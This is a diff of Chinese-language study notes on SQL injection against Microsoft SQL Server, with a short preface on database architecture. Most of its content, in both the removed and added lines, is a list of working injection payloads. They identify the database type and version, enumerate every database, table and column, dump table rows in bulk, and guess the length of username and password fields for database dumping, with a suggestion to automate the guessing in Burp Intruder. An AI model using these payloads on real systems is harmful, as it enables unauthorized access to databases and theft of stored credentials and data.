@@ -14,7 +14,7 @@
 
 ### 数据库架构组成
 
-除了Access之外，其他数据库组成架构基本相似，且Access目前在市面上很少。
+除了Access之外，其他数据库组成架构基本相似，且Access目前在市面上很少见。
 
 #### Access
 
@@ -30,7 +30,7 @@
 - 各个网站数据库只在自己网站目录下，和其他网站的数据库不关联，所以无法进行跨库操作
 - Access没有文件读写等操作
 
-#### MySQL msSQL等
+#### MySQL MSSQL等
 
 ##### 数据库架构
 
@@ -46,8 +46,8 @@
 
 ##### 特点
 
-- MySQL msSQL等，所有网站的数据库由数据库软件统一管理
-- 所有网站的数据库统一管理，且和其他网站的数据库相关联(information_schema库)，可以跨库操作
+- MySQL MSSQL等，所有网站的数据库由数据库软件统一管理
+- 所有网站的数据库统一管理，且和其他网站的数据库相关联(`information_schema`库)，可以跨库操作
 - 可以文件读写操作
 
 ### 数据库高权限操作
@@ -95,65 +95,65 @@ Microsoft SQL Server 是一个全面的数据库平台，使用集成的商业�
 
 ##### **①**判断数据库类型
 
-and exists (select * from sysobjects)--返回正常为mssql(也名sql server)
+`and exists (select * from sysobjects)--`返回正常为mssql(也名sql server)
 
-and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈
+`and exists (select count(*) from sysobjects)--`有时上面那个语句不行就试试这个哈
 
 ##### **②**判断数据库版本
 
-and 1=@@version--这个语句要在有回显的模式下才可以哦
+`and 1=@@version--`这个语句要在有回显的模式下才可以哦
 
-and substring((select  @@version),22,4)='2008'--适用于无回显模式，后面的2008就是数据库版本，     返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是        2008的话就返回正常）
+`and substring((select  @@version),22,4)='2008'--`适用于无回显模式，后面的2008就是数据库版本，     返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是        2008的话就返回正常）
 
 ##### **③**获取所有数据库的个数 (以下3条语句可供选择使用)
 
-1. and 1=(select quotename(count(name)) from master..sysdatabases)--
+1. `and 1=(select quotename(count(name)) from master..sysdatabases)--`
 
-2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --
+2. `and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --`
 
-3. and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --
+3. `and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --`
 
-  and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --
+  `and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --`
 
-  and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid>5) --
+  `and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid>5) --`
 
 说明：dbid从1-4的数据库一般为系统数据库.
 
-##### **④**获取数据库 （该语句是一次性获取全部数据库的，且语句只适合>=2005，两条语句可供选择使用）
+##### **④**获取数据库 （该语句是一次性获取全部数据库的，且语句只适合数据库版本>=2005，两条语句可供选择使用）
 
-​    and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--
+​    `and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--`
 
-​    and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--
+​    `and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--`
 
 ##### ⑤获取当前数据库
 
-and db_name()>0
+`and db_name()>0`
 
-and 1=(select db_name())--
+`and 1=(select db_name())--`
 
 ##### **⑥**获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于  mssql2005及以上版本）】
 
-​    and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))-- 
+   ` and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))-- `
 
-​     and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U'  FOR XML PATH(''))--
+​     `and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U'  FOR XML PATH(''))--`
 
 ##### **⑦**获得表里的列
 
 一次爆指定表的所有列（只限于mssql2005及以上版本）：
 
-​     and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))-- 
+​     `and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))-- `
 
-​     and 1=(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))--
+​     `and 1=(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))--`
 
 ##### ⑧获取指定数据库中的表的列的数据库
 
 逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：
 
-​    and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(''))--
+​    `and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(''))--`
 
 一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：
 
-​     and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--复制代码第一条语句：and  1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(''))--测试效果图：----------------------------------加上where条件筛选结果出来会更加好，如：where  and name like '%user%' 就会筛选出含有user关键词的出来。用在筛选表段时很不错。
+​     `and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--复制代码第一条语句：and  1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(''))--`测试效果图：----------------------------------加上where条件筛选结果出来会更加好，如：where  and name like '%user%' 就会筛选出含有user关键词的出来。用在筛选表段时很不错。
 
 转自：http://www.myhack58.com/Article/html/3/8/2015/63146.htm
 
@@ -229,19 +229,19 @@ https://www.secpulse.com/archives/3278.html
 
 ### MSSQL：
 
-1.`and 1=2` 报错
+1. `and 1=2` 报错
 
-2.`order by N#` 获取总字段
+2. `order by N#` 获取总字段
 
-3.猜表名 `and exists(select * from manage)` 表名manage存在
+3. 猜表名 `and exists(select * from manage)` 表名manage存在
 
-4.猜解列名 `and exists(select id from manage)` 列名id存在，同样username,password也存在
+4. 猜解列名 `and exists(select id from manage)` 列名id存在，同样username,password也存在
 
-5.脱裤 `and exists(select id from manage where id=1)` 证明id=1存在
+5. 拖库`and exists(select id from manage where id=1)` 证明id=1存在
 
-`and exists(select id from manage where%20 len(username)=8 and id=1)` 猜解username字段长度为8
+​	`and exists(select id from manage where%20 len(username)=8 and id=1)` 猜解username字段长度为8
 
-`and exists(select id from manage where%20 len(password)=16 and id=1)` 猜解password字段长度为16
+​	`and exists(select id from manage where%20 len(password)=16 and id=1)` 猜解password字段长度为16
 
 可用Burp的Intruder功能辅助猜解
 
